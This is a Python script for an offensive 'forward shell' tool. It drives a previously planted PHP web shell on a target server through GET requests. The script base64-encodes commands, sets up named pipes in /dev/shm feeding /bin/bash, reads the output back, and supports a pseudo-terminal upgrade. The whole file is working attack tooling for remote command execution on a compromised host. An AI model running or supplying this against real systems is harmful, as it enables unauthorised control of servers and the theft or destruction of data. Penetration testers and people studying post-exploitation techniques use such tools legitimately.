#!/usr/bin/env python3 
import requests, argparse, signal, sys, time, subprocess, random
from termcolor import colored
from base64 import b64encode

# Ctrl + c
def ctrl_c(sig, frame):
	print(colored("\n\n\t[!] Quiting...\n\n", 'red'))
	fwd_sh.kill_shell()
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Flags panel
def get_arguments():
    parser = argparse.ArgumentParser(description="Forward Shell")
    parser.add_argument("-t", "--target", required=True, dest="target_url", help="The target url (https://domain.com/malicious_file.php)")
    parser.add_argument("-q", "--query", required=False, dest="query_name", help="The query name, in $_GET['cmd'] the query name is 'cmd' (By default will be 0).")
    args = parser.parse_args()

    return args.target_url, args.query_name

# Forward Shell Class
class Forward_Shell:

	def __init__(self, target, query_name='0'):
		self.target = target
		self.input = ""
		self.output = ""
		self.query = query_name
		self.interactive_cmd = False
		self.cmd = '>>> '

	def create_random_name(self):
		
		random_name = ""
		for i in range(1,11):
			random_name+=chr(random.randint(65,90))
		
		return random_name


	def run_command(self, cmd):

		try:
			cmd = b64encode(cmd.encode()).decode()

			data = {
				self.query: 'echo "%s" | base64 -d > %s' % (cmd, self.input)
			}
			
			requests.get(self.target, params={self.query: f'echo "" > {self.output}'})
			requests.get(self.target, params=data)
			
			for _ in range(5):
				r = requests.get(self.target, params={self.query: f'/bin/cat {self.output}'})
				time.sleep(0.2)

			return r.text

		except Exception as e:
			return f"ERROR: {e}"


	def setup_shell(self):

		try:
			self.input = f'/dev/shm/{self.create_random_name()}'
			self.output = f'/dev/shm/{self.create_random_name()}'


			cmd = f'mkfifo {self.input}; tail -f {self.input} | /bin/bash 2>&1 > {self.output}'
			cmd = b64encode(cmd.encode()).decode()

			data = {
				self.query: 'echo "%s" | base64 -d | /bin/bash' % (cmd)
			}
			r = requests.get(self.target, params=data, timeout=5)

		except Exception as e:
			pass


	def kill_shell(self):
		cmd = f'/bin/rm {self.input} {self.output}'
		cmd = b64encode(cmd.encode()).decode()

		data = {
			self.query: 'echo "%s" | base64 -d | /bin/bash' % (cmd)
		}
		r = requests.get(self.target, params=data, timeout=5)


if __name__ == "__main__":
	target_url, query_name = get_arguments()
	fwd_sh = Forward_Shell(target_url)

	fwd_sh.setup_shell()


	while True:
		cmd = input(colored(fwd_sh.cmd,'yellow'))

		if 'script /dev/null -c bash' in cmd:
			fwd_sh.interactive_cmd = True
			print(colored("\n\n\t[+] Pseudo console initialized...\n\n","blue"))

		stdout = fwd_sh.run_command(cmd+'\n')


		if fwd_sh.interactive_cmd and cmd.strip() == "exit":
			fwd_sh.interactive_cmd = False
			print(colored("\n\n\t[!] Pseudo console finalizated.\n\n","red"))
			fwd_sh.cmd = '>>> '
			continue

		if fwd_sh.interactive_cmd:
			
			lines = stdout.split("\n")
			fwd_sh.cmd = lines[-1]

			if len(lines) == 3:
				cleared_stdout = '\n'.join(lines[:1])
			else:
				cleared_stdout = '\n'.join(lines[:1] + lines[2:-1])

			print(cleared_stdout)

		else:
			print(stdout)
